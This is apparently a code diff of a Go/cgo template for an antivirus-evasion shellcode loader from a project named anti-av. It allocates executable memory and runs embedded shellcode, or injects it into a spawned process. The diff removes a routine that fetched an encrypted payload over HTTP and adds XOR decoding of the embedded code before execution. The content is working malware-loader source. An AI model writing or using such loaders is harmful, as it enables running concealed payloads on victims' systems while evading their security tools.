@@ -1,32 +1,25 @@
-package main
+package sc
 
 /*
 #cgo windows CFLAGS: -DWIN=1
 
 #include <stdio.h>
-
-#if defined(WIN)
 #include <Windows.h>
 #include <tchar.h>
-#endif
 
 #define {{.HACK}} 1
 
 #ifdef NORMAL
 void sc(unsigned char *c, int c_len) {
-#if defined(WIN)
 	printf("[+] Alloc Code Memory\n");
 	void *exec = VirtualAlloc(0, c_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, c, c_len);
 	printf("[+] Call Code\n");
 	((void(*)())exec)();
-#else
-	printf("hello world!");
-#endif
 }
+
 #elif INJECT
 void sc(unsigned char *c, int c_len) {
-#if defined(WIN)
 	PROCESS_INFORMATION stProcessInfo = {0};
 	STARTUPINFO stStartUpInfo = {0};
 	stStartUpInfo.cb = sizeof(stStartUpInfo);
@@ -58,21 +51,12 @@ void sc(unsigned char *c, int c_len) {
   		printf("[-] Call Code Failed");
 	}
 	CloseHandle(hProc);
-	exit(0);
-#else
-	printf("hello world!");
-#endif
 }
-#else
-#error "Not Support HACK"
 #endif 
 
 */
 import "C"
 import (
-	"bytes"
-	"fmt"
-	"os"
 	"unsafe"
 
 	"github.com/b1gcat/anti-av/utils"
@@ -82,30 +66,17 @@ var (
 	Code = []byte{ {{.CODE}} }
 )
 
-func SC() {
-	payload()
+func Hi(p func([]byte)([]byte, error)) error {
+	var err error
+
+	kek := utils.Kek(Code[4:])
+	for k := range kek {
+		Code[k]^= kek[k]
+	}
+
+	if Code, err = p(Code); err != nil {
+		return err
+	}
 	C.sc((*C.uchar)(unsafe.Pointer(&Code[0])), C.int(len(Code)))
-}
-
-func payload() {
-	if bytes.HasPrefix(Code, []byte{0x0, 0x0, 0x0, 0x0}) {
-		url, err := utils.DeCrypt(Code)
-		if err != nil {
-			fmt.Println("[x] ", err.Error())
-			os.Exit(0)
-		}
-		payload, err := utils.HttpGet(string(url), "{{.HOST_OBFUSCATOR}}")
-		if err != nil {
-			fmt.Println("[-] ", err.Error())
-			os.Exit(0)
-		}
-		Code = payload
-	}
-	payload, err := utils.DeCrypt(Code)
-	if err != nil {
-		fmt.Println("[-] ", err.Error())
-		os.Exit(0)
-	}
-
-	Code = payload
+	return nil
 }
